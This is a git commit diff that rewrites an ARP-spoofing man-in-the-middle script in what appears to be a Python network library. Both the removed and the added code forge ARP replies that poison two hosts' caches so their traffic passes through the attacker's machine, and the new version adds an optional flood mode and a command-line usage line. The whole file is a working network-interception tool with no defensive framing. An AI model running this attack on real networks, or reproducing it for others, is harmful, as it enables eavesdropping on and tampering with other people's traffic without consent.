803e67e13c4e1f2fe0def7ee142e4a8fb1ca51d7
Claudjos <claudjosmail@gmail.com>
2022-04-05 14:37:20 +0200

    arp.mitm: rewrote script using Spoofer service

--- agave/arp/mitm.py
+++ agave/arp/mitm.py
@@ -1,102 +1,69 @@
-import time
-from typing import Tuple
-from agave.core import ethernet, arp
-from agave.core.ethernet import MACAddress
-from agave.nic.interfaces import NetworkInterface
-from .utils import ARPReaderLoop, HOST
+"""Man In The Middle with ARP Spoofing.
 
+Usage:
 
-class MITM(ARPReaderLoop):
+	python3 -m agave.arp.mitm <alice> <bob> [-f]
 
-	def __init__(
-		self,
-		interface: NetworkInterface,
-		alice: HOST,
-		bob: HOST,
-		flood_interval: float = 1
-	):
-		super().__init__(selector_timeout=flood_interval)
-		self.message_for_bob = arp.ARP.is_at(
-			interface.mac.address, alice[1],
-			bob[0].address, bob[1]
-		)
-		self.message_for_alice = arp.ARP.is_at(
-			interface.mac.address, bob[1],
-			alice[0].address, alice[1]
-		)
-		self.gratuitous_timeout = flood_interval
-		self.last_gratuitous = time.time()
-		self.interface = (interface.name, 1)
-		self.bob_ip = bob[1].packed
-		self.alice_ip = alice[1].packed
-
-	def send_gratuitous(self):
-		self._sock.sendto(self.message_for_bob, self.interface)
-		self._sock.sendto(self.message_for_alice, self.interface)
-		self.last_gratuitous = time.time()
-
-	def should_send_gratuitous(self):
-		return self.gratuitous_timeout < (time.time() - self.last_gratuitous)
-
-	def process(self, address: Tuple, eth: ethernet.Ethernet, frame: arp.ARP):
-		if frame.operation == arp.OPERATION_REQUEST:
-			# if alice requests bob's mac
-			if (frame.target_protocol_address == self.bob_ip and
-					frame.sender_protocol_address == self.alice_ip):
-				self._sock.sendto(self.message_for_alice, self.interface)
-			# if bob requests alice's mac
-			elif (frame.target_protocol_address == self.alice_ip and
-					frame.sender_protocol_address == self.bob_ip):
-				self._sock.sendto(self.message_for_bob, self.interface)
-
-	def after(self):
-		if self.should_send_gratuitous():
-			self.send_gratuitous()
-
-	def run(self):
-		self.send_gratuitous()
-		super().run()
-
-
+"""
 if __name__ == "__main__":
-	"""
-	Man in the middle using ARP reply spoofing.
 
-	Usage:
-		python3 -m agave.arp.mitm <interface> <bob IPv4> <alice IPv4>
-
-	Example:
-		python3 -m agave.arp.mitm eth0 192.168.1 192.168.1.2
-
-	"""
 	import sys
+	from agave.core.arp import ARP, OPERATION_REQUEST
+	from agave.core.ethernet import ETHER_TYPE_ARP, MACAddress
+	from agave.nic.interfaces import NetworkInterface
+	from .utils import create_filter, _create_socket
+	from .resolve import resolve_mac
+	from .spoof import Spoofer
 	from ipaddress import IPv4Address
-	from agave.nic.interfaces import NetworkInterfaceNotFound
-	from agave.arp.resolve import resolve
 
-	
+
 	try:
-		print("Resolving addresses ...")
-		interface = NetworkInterface.get_by_name(sys.argv[1])
-		alice_ip = IPv4Address(sys.argv[2])
-		alice_mac = resolve(interface, alice_ip)
-		if alice_mac is None:
-			print("Unable to resolve mac for {}".format(alice_ip))
-			exit(0)
-		print("Resolved {} to {}".format(alice_ip, alice_mac))
-		bob_ip = IPv4Address(sys.argv[3])
-		bob_mac = resolve(interface, bob_ip)
-		if bob_mac is None:
-			print("Unable to resolve mac for {}".format(bob_ip))
-			exit(0)
-		print("Resolved {} to {}".format(bob_ip, bob_mac))
-		print("Running ...")
-		MITM(
-			interface,
-			(alice_mac, alice_ip),
-			(bob_mac, bob_ip)
-		).run()
-	except NetworkInterfaceNotFound as e:
-		print(e)
-	except KeyboardInterrupt as e:
+		# Parses arguments
+		alice = IPv4Address(sys.argv[1])
+		bob = IPv4Address(sys.argv[2])
+		interface = NetworkInterface.get_by_host(alice)
+		if len(sys.argv) > 3 and sys.argv[3] == "-f":
+			print("[INFO] Flood gratuitous is enabled.")
+			gratuitous = True
+		else:
+			gratuitous = False
+		# Initialize var
+		sock = _create_socket()
+		messages = []
+		# Build filters 
+		filter_alice = create_filter(OPERATION_REQUEST, sender=alice, target=bob)
+		filter_bob = create_filter(OPERATION_REQUEST, sender=bob, target=alice)
+		if gratuitous:
+			# Resolving addresses
+			alice_mac = resolve_mac(alice, interface, sock, raise_on_miss=True)
+			bob_mac = resolve_mac(bob, interface, sock, raise_on_miss=True)
+			# Build messages
+			message_for_alice = ARP.is_at(
+				interface.mac.address, bob,
+				alice_mac.address, alice
+			)
+			message_for_bob = ARP.is_at(
+				interface.mac.address, alice,
+				bob_mac.address, bob
+			)
+			addr = (interface.name, ETHER_TYPE_ARP)
+			messages = [(message_for_bob, addr), (message_for_alice, addr)]
+		# Build service
+		service = Spoofer(
+			sock,
+			interface.mac,
+			lambda x: filter_alice(x) or filter_bob(x),
+			messages,
+			interval=(1 if gratuitous else 3600),
+			wait=0
+		)
+		# Running
+		print("[INFO] Running...")
+		service.run()
+
+	except KeyboardInterrupt:
 		pass
+	except BaseException as e:
+		raise e
+		print(f"[ERROR] {e}")
+
